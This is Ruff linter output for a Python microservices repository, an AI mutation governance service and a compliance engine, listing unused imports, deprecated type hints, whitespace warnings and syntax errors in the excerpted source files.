  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:20
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:25
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.errors.ValidationError` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:9:36
   |
 7 | from uuid import UUID
 8 |
 9 | from .errors import NotFoundError, ValidationError
   |                                    ^^^^^^^^^^^^^^^
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
   |
help: Remove unused import: `.errors.ValidationError`

F401 [*] `.metrics.DOMAIN_FAILURES` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:11:37
   |
 9 | from .errors import NotFoundError, ValidationError
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
   |                                     ^^^^^^^^^^^^^^^
12 | from .models import MutationProposal, ProposalCreate, ProposalUpdate
13 | from .repository import ProposalRepository
   |
help: Remove unused import: `.metrics.DOMAIN_FAILURES`

F401 [*] `.models.ProposalUpdate` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:12:55
   |
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
12 | from .models import MutationProposal, ProposalCreate, ProposalUpdate
   |                                                       ^^^^^^^^^^^^^^
13 | from .repository import ProposalRepository
   |
help: Remove unused import: `.models.ProposalUpdate`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:61:10
   |
59 |     async def list_proposals(
60 |         self, offset: int = 0, limit: int = 20
61 |     ) -> Tuple[List[MutationProposal], int]:
   |          ^^^^^
62 |         return await self.repository.list(offset, limit)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:61:16
   |
59 |     async def list_proposals(
60 |         self, offset: int = 0, limit: int = 20
61 |     ) -> Tuple[List[MutationProposal], int]:
   |                ^^^^
62 |         return await self.repository.list(offset, limit)
   |
help: Replace with `list`

E402 Module level import not at top of file
  --> emergent-microservices\ai-mutation-governance-firewall\app\services.py:71:1
   |
71 | import asyncio  # for create_task in process_proposal
   | ^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\ai-mutation-governance-firewall\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\ai-mutation-governance-firewall\setup.py:6:17
  |
4 |     name="AI Mutation Governance Firewall",
5 |     version="1.0.0",
6 |     description="build a runtime AI mutation gate.
  |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | Microservices:
8 | Model change proposal intake
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\ai-mutation-governance-firewall\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="build a runtime AI mutation gate.
7 | Microservices:
  | ^^^^^^^^^^^^^
8 | Model change proposal intake
9 | Deterministic shadow simulation
  |

invalid-syntax: Expected `,`, found `:`
 --> emergent-microservices\ai-mutation-governance-firewall\setup.py:7:14
  |
5 |     version="1.0.0",
6 |     description="build a runtime AI mutation gate.
7 | Microservices:
  |              ^
8 | Model change proposal intake
9 | Deterministic shadow simulation
  |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:8:1
   |
 6 |     description="build a runtime AI mutation gate.
 7 | Microservices:
 8 | Model change proposal intake
   | ^^^^^
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:8:7
   |
 6 |     description="build a runtime AI mutation gate.
 7 | Microservices:
 8 | Model change proposal intake
   |       ^^^^^^
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:8:14
   |
 6 |     description="build a runtime AI mutation gate.
 7 | Microservices:
 8 | Model change proposal intake
   |              ^^^^^^^^
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:8:23
   |
 6 |     description="build a runtime AI mutation gate.
 7 | Microservices:
 8 | Model change proposal intake
   |                       ^^^^^^
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:9:1
   |
 7 | Microservices:
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
   | ^^^^^^^^^^^^^
10 | Quorum validation engine
11 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:9:15
   |
 7 | Microservices:
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
   |               ^^^^^^
10 | Quorum validation engine
11 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:9:22
   |
 7 | Microservices:
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
   |                      ^^^^^^^^^^
10 | Quorum validation engine
11 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:10:1
   |
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   | ^^^^^^
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:10:8
   |
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |        ^^^^^^^^^^
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:10:19
   |
 8 | Model change proposal intake
 9 | Deterministic shadow simulation
10 | Quorum validation engine
   |                   ^^^^^^
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:11:1
   |
 9 | Deterministic shadow simulation
10 | Quorum validation engine
11 | Rollback + snapshot manager
   | ^^^^^^^^
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:11:21
   |
 9 | Deterministic shadow simulation
10 | Quorum validation engine
11 | Rollback + snapshot manager
   |                     ^^^^^^^
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:12:1
   |
10 | Quorum validation engine
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   | ^^^^^^^^^^^^^
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:12:15
   |
10 | Quorum validation engine
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   |               ^^^^^^
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:12:22
   |
10 | Quorum validation engine
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
   |                      ^^^^^^^^^^^^
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:1
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   | ^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:6
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |      ^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:13
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |             ^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ£
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:15
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |               ^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:16
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                ^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:18
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                  ^^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:29
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                             ^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:39
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:39
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Unparenthesized generator expression cannot be used here
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:39
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `in`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:57
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                         ^^^^^^^^^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ¥
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:67
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found Unknown
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:13:67
   |
11 | Rollback + snapshot manager
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:14:1
   |
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   | ^^^^^^^^^^^^^
15 | DARPA, defense, sovereign AI labs would care.",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:14:15
   |
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   |               ^^^
15 | DARPA, defense, sovereign AI labs would care.",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:14:19
   |
12 | Cryptographic replay verification
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
   |                   ^^^^^
15 | DARPA, defense, sovereign AI labs would care.",
16 |     author="IAmSoThirsty",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:8
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |        ^^^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:17
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                 ^^^^^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:27
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                           ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:30
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                              ^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:35
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                                   ^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:41
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:41
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:46
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:15:46
   |
13 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
16 |     author="IAmSoThirsty",
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\setup.py:16:5
   |
14 | This is niche but elite.
15 | DARPA, defense, sovereign AI labs would care.",
16 |     author="IAmSoThirsty",
   |     ^^^^^^
17 |     packages=find_packages(exclude=["tests", "tests.*"]),
18 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\ai-mutation-governance-firewall\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\ai-mutation-governance-firewall\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Autonomous Compliance-as-Code Engine"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\autonomous-compliance\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
